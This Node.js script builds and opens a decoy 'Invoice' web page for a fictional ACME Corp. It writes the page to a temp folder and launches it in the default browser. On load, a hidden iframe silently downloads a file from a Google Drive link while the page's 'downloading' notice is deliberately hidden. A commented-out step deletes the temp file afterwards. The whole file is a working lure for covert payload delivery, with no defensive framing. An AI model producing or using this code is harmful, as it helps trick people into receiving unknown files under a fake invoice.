const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');

const DOWNLOAD_LINK = 'https://drive.google.com/uc?export=download&id=1r1whMfqrGK5Xs0Ygzw4ClqzEHotMj5J1';

const decoyContent = `
    <!DOCTYPE html>
    <html>
    <head>
        <title>Invoice</title>
        <style>
            body { font-family: sans-serif; margin: 40px; }
            h1, h2 { color: #333; }
            .download-message {
                display: none; /* Hide this message, download will be in background */
            }
        </style>
    </head>
    <body>
        <h1>Company: ACME Corp</h1>
        <h2>Invoice #: 12345</h2>
        <p>Date: 26-Aug-2025</p>
        <p>Amount: $250.00</p>

        <div class="download-message">
            <p>Your invoice is downloading in the background...</p>
        </div>

        <script>
            const downloadLink = '${DOWNLOAD_LINK}'; // Injected by Node.js
            
            function initiateDownload() {
                const iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                iframe.src = downloadLink;
                document.body.appendChild(iframe);
                console.log('Download initiated for:', downloadLink);
            }

            window.onload = initiateDownload;
        </script>
    </body>
    </html>
`;

// Create a temporary HTML file
const tempFileName = `decoy-${Date.now()}.html`;
const tempFilePath = path.join(process.env.TEMP || process.env.TMPDIR || '/tmp', tempFileName);

fs.writeFile(tempFilePath, decoyContent, (err) => {
    if (err) {
        console.error('Failed to write temporary decoy file:', err);
        return;
    }

    // Open the temporary HTML file in the default browser
    let command;
    switch (process.platform) {
        case 'darwin': // macOS
            command = `open "${tempFilePath}"`;
            break;
        case 'win32': // Windows
            command = `start "" "${tempFilePath}"`;
            break;
        default: // Linux and other POSIX systems
            command = `xdg-open "${tempFilePath}"`;
            break;
    }

    exec(command, (error, stdout, stderr) => {
        if (error) {
            console.error(`Error opening file: ${error.message}`);
            return;
        }
        if (stderr) {
            console.error(`Stderr: ${stderr}`);
            return;
        }
        console.log(`Opened decoy HTML in browser: ${tempFilePath}`);

        // Optionally, delete the temporary file after a delay
        // setTimeout(() => {
        //     fs.unlink(tempFilePath, (unlinkErr) => {
        //         if (unlinkErr) console.error('Error deleting temp file:', unlinkErr);
        //         else console.log('Temporary decoy file deleted.');
        //     });
        // }, 5000); // Delete after 5 seconds
    });
});
